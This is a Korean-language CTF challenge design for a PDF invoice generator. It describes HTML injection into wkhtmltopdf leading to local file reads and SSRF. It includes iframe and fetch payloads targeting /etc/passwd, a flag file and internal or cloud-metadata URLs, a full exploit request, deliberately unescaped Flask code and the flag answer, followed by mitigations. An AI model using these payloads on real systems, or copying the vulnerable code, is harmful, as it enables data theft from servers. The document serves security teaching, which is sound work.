---
title: PDF Generator HTML Injection leading to SSRF — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, html-injection, ssrf, pdf-generator, wkhtmltopdf, lfi]
confidence: high
---

# PDF Generator HTML Injection leading to SSRF — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Invoice Creator (인보이스 생성기)
- **난이도**: Medium
- **핵심 컨셉**: 웹 서버 내의 **HTML to PDF 렌더러** 취약점을 활용한 **SSRF / LFI** 연계 문제입니다. 사용자는 자신의 비즈니스 정보를 담아 영수증(PDF)을 발급받을 수 있습니다. 사용자가 입력한 데이터는 영수증 HTML 템플릿에 동적으로 반영된 후, 서버 내에서 `wkhtmltopdf` 또는 `puppeteer` 같은 도구에 의해 PDF 파일로 컴파일됩니다. 만약 입력값 검증이 미흡하여 HTML 마크업(예: `<script>`, `<iframe>`)을 직접 주입할 수 있다면, 서버 내부의 렌더러 입장에서 HTML이 실행되면서 로컬 시스템 파일(LFI)이나 내부 API 서비스의 값(SSRF)을 취득하고, 그 결과를 고스란히 생성된 PDF의 화면 이미지/텍스트로 복사하여 반환받는 방식으로 플래그를 수집합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Invoice Builder**: 수신자명, 항목, 가격 등을 입력하여 "인보이스 PDF 다운로드" 요청을 생성하는 인터페이스.
- **Backend Service (Python/Flask or Node.js)**:
  - 사용자 데이터를 HTML 템플릿 스트링과 조합.
  - 내장 유틸리티 `wkhtmltopdf`를 서브프로세스로 띄워 PDF 파일을 만들고 클라이언트에 리턴.
- **가상 내부 API**: `http://169.254.169.254/latest/meta-data/` 또는 `http://localhost:5000/internal/flag`
- **Flag 위치**: 
  - 서버 로컬 시스템 파일: `/etc/passwd` 또는 `/app/flag.txt`
  - 혹은 내부 클라우드 메타데이터 URL의 비밀 필드값.

### 2.2 취약점 지점
1. **Unsanitized HTML Injection in PDF Renderer**:
   - 렌더러에 넘어가기 전 템플릿 변수가 제대로 이스케이프(Html Escape)되지 않아 사용자가 임의의 HTML 엘리먼트를 삽입할 수 있습니다.
2. **Unrestricted File/Network Access inside Renderer**:
   - `wkhtmltopdf` 등의 엔진은 로컬 경로(`file://`)에 대한 접근과 원격 웹 요청(`http://`)을 기본 권한으로 차단하지 않고 렌더링을 처리합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 (Body JSON) | 반환 값 | 비고 |
|------------|--------|------|--------------------|---------|------|
| `/api/invoice`| POST | 없음 | `{"client_name": "사용자이름"}`| PDF 바이너리 스트림 | HTML Injection 발생 타겟 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. HTML 인젝션 동작 테스트
공격자는 인보이스 생성 데이터로 HTML 태그를 삽입한 뒤 완성된 PDF의 렌더링 변화를 봅니다.
- *주입 입력*: `{"client_name": "<h1>Test Head</h1>"}`
- *결과*: 다운로드받은 PDF 문서에 `Test Head`가 큰 제목 크기(H1)로 스타일이 깨져 렌더링된 것을 보고 HTML Injection이 성립됨을 확인합니다.

### Step 2. iframe 및 script를 활용한 LFI/SSRF 구문 주입
PDF 변환을 진행하는 내부 렌더러가 로컬 파일에 접근하여 PDF 바디에 그리도록 유도합니다.
- **기법 1: iframe을 활용한 파일 읽기 (LFI)**
  ```html
  <iframe src="file:///etc/passwd" width="600" height="400"></iframe>
  ```
- **기법 2: javascript를 이용한 동적 데이터 획득 후 화면에 그리기 (SSRF/LFI)**
  ```html
  <script>
    // 내부 챌린지 로컬 엔드포인트를 비동기로 읽어 화면에 출력시킴
    fetch('http://127.0.0.1:5000/internal/flag')
      .then(response => response.text())
      .then(data => {
          document.write(data);
      });
  </script>
  ```

### Step 3. 최종 익스플로잇 요청 및 PDF 내려받기
공격자는 완성된 페이로드를 POST 요청 인자로 주입합니다.
- *요청*:
  ```http
  POST /api/invoice HTTP/1.1
  Host: invoice.challenge.local
  Content-Type: application/json

  {
    "client_name": "<iframe src='file:///app/flag.txt' width='100%' height='300px'></iframe>"
  }
  ```

### Step 4. flag 획득
서버는 이 데이터를 포함한 HTML을 생성해 `wkhtmltopdf`를 실행하고 결과 PDF 파일을 생성합니다. 생성된 PDF를 아크로뱃 리더나 웹 브라우저로 실행해 보면, 인보이스 클라이언트 네임 표시 영역 안에 `/app/flag.txt` 파일의 로컬 내용(예: `FLAG{pdf_html_injection_ssrf_lfi}`)이 렌더링된 사각형 아이프레임 박스가 이미지나 텍스트로 보이며 이를 읽어 플래그를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python Flask with pdfkit)

```python
# app.py
from flask import Flask, request, send_file, render_template_string
import pdfkit
import tempfile
import os

app = Flask(__name__)

# 가상 내부 플래그 조회 포트
@app.route("/internal/flag")
def get_internal_flag():
    # 로컬에서만 들어올 수 있는 비공개 페이지
    if request.remote_addr != "127.0.0.1":
        return "Access Denied", 403
    return "FLAG{pdf_html_injection_ssrf_lfi}"

@app.route("/api/invoice", methods=["POST"])
def generate_pdf():
    data = request.get_json()
    # 취약점 지점: 입력값에 대한 HTML 이스케이프 부재
    client_name = data.get("client_name", "Valued Client")
    
    # PDF로 그릴 원본 HTML 문자열 템플릿
    html_template = f"""
    <html>
    <head><style>body {{ font-family: sans-serif; }}</style></head>
    <body>
        <h1>INVOICE</h1>
        <p>Prepared for: {client_name}</p>
        <p>Date: 2026-06-14</p>
    </body>
    </html>
    """
    
    # 임시 파일 경로 관리
    temp_dir = tempfile.gettempdir()
    html_path = os.path.join(temp_dir, "invoice.html")
    pdf_path = os.path.join(temp_dir, "invoice.pdf")
    
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(html_template)
        
    try:
        # 취약점 지점: wkhtmltopdf 실행 시 
        # 로컬 파일 바인딩(--allow) 제한이나 네트워크 접근 금지 정책 옵션이 없음
        # pdfkit.from_file을 수행하면 서브프로세스로 wkhtmltopdf가 구동됨
        pdfkit.from_file(html_path, pdf_path)
        return send_file(pdf_path, mimetype="application/pdf")
        
    except Exception as e:
        return str(e), 500
    finally:
        # 파일 정리
        if os.path.exists(html_path): os.remove(html_path)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **입력값 HTML 이스케이프 처리 (HTML Escaping)**:
   - 클라이언트 제공 텍스트를 템플릿에 동적으로 바인딩할 때, 항상 특수 문자(`<`, `>`, `&`, `"`, `'`)를 문자로 표현하는 HTML entity로 변환합니다.
   - **수정 예시 (Python)**:
     ```python
     import html
     safe_client_name = html.escape(client_name)
     ```
2. **PDF 렌더러 실행 샌드박싱 및 옵션 제한**:
   - `wkhtmltopdf` 실행 옵션에서 로컬 파일 로드를 제한하는 `--disable-local-file-access` 설정을 주입하거나, 외부 네트워크 통신을 차단하는 모드를 설정합니다.
3. **독립된 격리 환경 실행**:
   - PDF 컨버터 모듈은 주 백엔드 앱 서버와 분리된 완전 격리 컨테이너(Docker Sandbox)에서 네트워크 아웃바운드가 차단된 상태로 안전하게 구동되도록 분리합니다.
